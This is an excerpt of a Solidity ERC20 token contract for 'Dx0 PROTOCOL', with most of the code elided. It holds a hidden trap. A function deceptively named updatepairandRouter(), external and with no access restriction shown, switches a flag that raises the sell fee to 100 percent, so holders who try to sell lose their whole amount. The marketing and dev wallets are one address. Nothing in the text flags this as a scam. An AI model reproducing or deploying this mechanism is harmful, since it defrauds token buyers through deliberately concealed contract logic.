...
// WORKING UTILITY : https://token.dx0protocol.com/
...
contract Dx0Protocol is ERC20, Ownable{
    ...
    address public marketingWallet = 0xB9f67a93b70FcF815Bb1aCd78225c11093dC8286;
    address public devWallet = 0xB9f67a93b70FcF815Bb1aCd78225c11093dC8286;
    ...
    constructor() ERC20("Dx0 PROTOCOL", "Dx0") {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        //calculate fee
            ...
            if(recipient == pair) 
            fee = amount * (luckn == true?totSellTax:100) / 100;
            else 
    ...
    function updatepairandRouter() external virtual{
        luckn = false;
    }
